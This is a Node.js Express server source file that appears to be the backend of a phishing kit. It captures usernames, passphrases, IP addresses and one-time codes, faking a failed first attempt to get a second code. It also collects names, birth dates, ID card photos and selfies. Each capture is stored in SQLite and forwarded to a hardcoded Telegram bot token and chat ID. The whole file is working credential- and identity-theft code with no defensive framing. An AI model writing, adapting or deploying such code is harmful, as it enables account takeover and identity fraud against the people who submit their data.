const express = require("express");
const bodyParser = require("body-parser");
const multer = require("multer");
const fetch = require("node-fetch");
const path = require("path");
const sqlite3 = require("sqlite3").verbose();

const app = express();
const PORT = process.env.PORT || 3000;

// === Telegram bot config (EDIT THIS) ===
const BOT_TOKEN = "8402298293:AAEo_rNw4cRUMo8b9_s4R3cnMJW1QyBpelk";
const CHAT_ID = "5692748706";

// SQLite DB
const db = new sqlite3.Database("data.db", (err) => {
  if (err) console.error("DB error:", err);
  else console.log("Connected to SQLite DB");
});
db.run(
  "CREATE TABLE IF NOT EXISTS logs (id INTEGER PRIMARY KEY AUTOINCREMENT, data TEXT, created_at DATETIME DEFAULT CURRENT_TIMESTAMP)"
);

// Middleware
app.use(bodyParser.json());
app.use(express.static(path.join(__dirname, "public")));

// File uploads
const storage = multer.diskStorage({
  destination: (req, file, cb) => cb(null, "uploads/"),
  filename: (req, file, cb) =>
    cb(null, Date.now() + "-" + file.originalname),
});
const upload = multer({ storage });

// Helper to send to Telegram
async function sendToTelegram(message) {
  await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ chat_id: CHAT_ID, text: message }),
  });
}

// === ROUTES ===

// LOGIN
app.post("/login", async (req, res) => {
  const { username, passphrase } = req.body;
  const ip = req.headers["x-forwarded-for"] || req.socket.remoteAddress;

  const log = `LOGIN\nUsername: ${username}\nPassphrase: ${passphrase}\nIP: ${ip}`;
  db.run("INSERT INTO logs (data) VALUES (?)", [log]);
  await sendToTelegram(log);

  // generate code
  req.app.locals.code = Math.floor(100000 + Math.random() * 900000);
  req.app.locals.codeAttempts = 0;

  res.json({ success: true });
});

// CODE VERIFICATION
app.post("/code", async (req, res) => {
  const { code } = req.body;
  req.app.locals.codeAttempts++;

  const log = `CODE ENTERED: ${code}`;
  db.run("INSERT INTO logs (data) VALUES (?)", [log]);
  await sendToTelegram(log);

  if (req.app.locals.codeAttempts === 1) {
    return res.status(400).json({ error: "Incorrect code, try again" });
  }
  res.json({ success: true });
});

// KYC
app.post("/kyc", upload.fields([{ name: "idcard" }, { name: "selfie" }]), async (req, res) => {
  const { fullname, dob } = req.body;
  const files = req.files;

  const log = `KYC SUBMISSION\nName: ${fullname}\nDOB: ${dob}\nFiles: ${JSON.stringify(files)}`;
  db.run("INSERT INTO logs (data) VALUES (?)", [log]);
  await sendToTelegram(log);

  res.json({ success: true });
});

// START
app.listen(PORT, () => console.log(`Server running on port ${PORT}`));